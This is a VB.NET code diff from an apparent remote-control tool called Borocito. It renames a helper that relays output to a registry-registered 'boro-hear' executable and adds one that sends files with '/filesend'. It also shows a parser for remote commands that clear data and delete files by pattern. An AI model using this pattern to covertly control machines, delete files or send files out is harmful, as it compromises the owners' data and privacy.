@@ -24,7 +24,9 @@ Module Utility
             Return "[AddToLog@Utility]Error: " & ex.Message
         End Try
     End Function
-    Function BoroHearInterop(Optional ByVal content As String = Nothing) As Boolean
+End Module
+Module Boro_Hear
+    Function BoroHearSendContent(Optional ByVal content As String = Nothing) As Boolean
         Try
             Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get\\boro-hear", True)
             If regKey Is Nothing Then
@@ -32,7 +34,7 @@ Module Utility
             Else
                 Try
                     If content <> Nothing Then
-                        AddToLog("BoroHearInterop", content, False)
+                        AddToLog("BoroHearSendContent", content, False)
                         Process.Start(regKey.GetValue("boro-hear"), content)
                     End If
                     Return True
@@ -41,7 +43,28 @@ Module Utility
                 End Try
             End If
         Catch ex As Exception
-            Console.WriteLine("[BoroHearInterop@Init]Error: " & ex.Message)
+            Console.WriteLine("[BoroHearSendContent@Init]Error: " & ex.Message)
+            Return False
+        End Try
+    End Function
+    Function BoroHearSendFile(Optional ByVal filePath As String = Nothing) As Boolean
+        Try
+            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get\\boro-hear", True)
+            If regKey Is Nothing Then
+                Return False
+            Else
+                Try
+                    If filePath <> Nothing Then
+                        AddToLog("BoroHearSendFile", filePath, False)
+                        Process.Start(regKey.GetValue("boro-hear"), "/filesend " & filePath)
+                    End If
+                    Return True
+                Catch
+                    Return False
+                End Try
+            End If
+        Catch ex As Exception
+            Console.WriteLine("[BoroHearSendFile@Init]Error: " & ex.Message)
             Return False
         End Try
     End Function
@@ -92,13 +115,13 @@ Module StartUp
                 For Each args As String In parameter.Split(",") '/deleteFiles *.jpg
                     Dim arg() As String = args.Split(" ")
                     If parameter.ToLower Like "*/fullclear*" Then
-                        BoroHearInterop(Main.FullClear())
+                        BoroHearSendContent(Main.FullClear())
 
                     ElseIf parameter.ToLower Like "*/deletefiles*" Then
-                        BoroHearInterop(Main.DeleteFiles(arg(1)))
+                        BoroHearSendContent(Main.DeleteFiles(arg(1)))
 
                     ElseIf parameter.ToLower Like "*/boro-get*" Then
-                        BoroHearInterop(Main.boroGETcomponents(arg(1)))
+                        BoroHearSendContent(Main.boroGETcomponents(arg(1)))
 
                     ElseIf parameter.ToLower Like "*/stop*" Then
                         End
